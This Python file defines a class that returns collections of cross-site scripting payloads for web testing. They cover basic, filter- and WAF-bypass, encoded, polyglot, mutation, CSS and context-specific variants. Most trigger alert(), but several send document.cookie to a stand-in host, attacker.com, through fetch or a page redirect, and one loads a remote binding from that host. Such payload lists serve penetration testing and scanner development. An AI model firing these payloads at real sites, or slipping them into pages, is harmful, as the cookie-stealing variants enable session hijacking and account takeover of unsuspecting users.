class XSSPayloads:
    @staticmethod
    def get_payloads():
        return [
            # Basic payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Bypass filters
            "<img src=x onerror=alert('XSS')//",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            
            # Event handlers
            "<div onmouseover=\"alert('XSS')\">hover me</div>",
            "<iframe onload=\"alert('XSS')\"></iframe>",
            
            # Encoded payloads
            "&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            
            # DOM-based XSS
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            
            # More advanced payloads
            "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
            "<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>",
            "<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>",
        ]
    
    @staticmethod
    def get_advanced_payloads():
        return [
            # More sophisticated payloads for bypassing WAFs and filters
            "<script>setTimeout(()=>{alert('XSS')},1000)</script>",
            "<script>setInterval(()=>{alert('XSS')},1000)</script>",
            "<img src=1 href=1 onerror=\"javascript:alert('XSS')\" onload=\"javascript:alert('XSS')\"></img>",
            "<audio src=1 href=1 onerror=\"javascript:alert('XSS')\" onload=\"javascript:alert('XSS')\"></audio>",
            "<video src=1 href=1 onerror=\"javascript:alert('XSS')\" onload=\"javascript:alert('XSS')\"></video>",
            "<body src=1 href=1 onerror=\"javascript:alert('XSS')\" onload=\"javascript:alert('XSS')\"></body>",
            "<image src=1 href=1 onerror=\"javascript:alert('XSS')\" onload=\"javascript:alert('XSS')\"></image>",
            "<object src=1 href=1 onerror=\"javascript:alert('XSS')\" onload=\"javascript:alert('XSS')\"></object>",
            "<script src=1 href=1 onerror=\"javascript:alert('XSS')\" onload=\"javascript:alert('XSS')\"></script>",
            "<svg onResize svg onResize=\"javascript:javascript:alert('XSS')\"></svg onResize>",
            "<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert('XSS')\"></title onPropertyChange>",
            "<iframe onLoad iframe onLoad=\"javascript:javascript:alert('XSS')\"></iframe onLoad>",
            "<body onMouseEnter body onMouseEnter=\"javascript:javascript:alert('XSS')\"></body onMouseEnter>",
            "<body onFocus body onFocus=\"javascript:javascript:alert('XSS')\"></body onFocus>",
            "<details open ontoggle=\"alert('XSS')\">",
            "<div tabindex=\"0\" onblur=\"alert('XSS')\">lose focus",
            
            # Polyglot payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
            
            # Mutation XSS
            "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')\">",
            
            # CSS-based XSS
            "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert('XSS')\"></xss>",
            "<style>*[{}*{background:url(\"javascript:alert('XSS')\");}</style>",
            
            # HTML5 vectors
            "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert('XSS')&gt;\"></table></mtext></math>",
            
            # AngularJS-based XSS
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            
            # jQuery-based XSS
            "<a id=\"test\" href=\"javascript:alert('XSS')\">click me</a><script>$('#test').click()</script>",
            
            # Browser-specific XSS
            "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert('XSS')</x:script>",
            
            # XML-based XSS
            "<xml:namespace prefix=\"t\"><import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert('XSS')&lt;/SCRIPT&gt;\"></xml:namespace>",
        ]
    
    @staticmethod
    def get_context_specific_payloads():
        """Get payloads specific to different contexts"""
        return {
            "attribute": [
                "\" onmouseover=\"alert('XSS')\" \"",
                "\" onfocus=\"alert('XSS')\" autofocus \"",
                "\" onblur=\"alert('XSS')\" autofocus \"",
                "\" onkeydown=\"alert('XSS')\" \"",
                "\" onload=\"alert('XSS')\" \"",
                "\" onerror=\"alert('XSS')\" \"",
            ],
            "javascript": [
                "\";alert('XSS');//",
                "\"-alert('XSS')-\"",
                "\"+alert('XSS')+\"",
                "\\';alert('XSS');//",
                "\\'-alert('XSS')-\\'",
                "\\'+alert('XSS')+\\'",
            ],
            "url": [
                "javascript:alert('XSS')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
                "vbscript:alert('XSS')",
            ],
            "css": [
                "expression(alert('XSS'))",
                "behavior:url(javascript:alert('XSS'))",
                "-moz-binding:url('http://attacker.com/xss.xml')",
            ]
        }

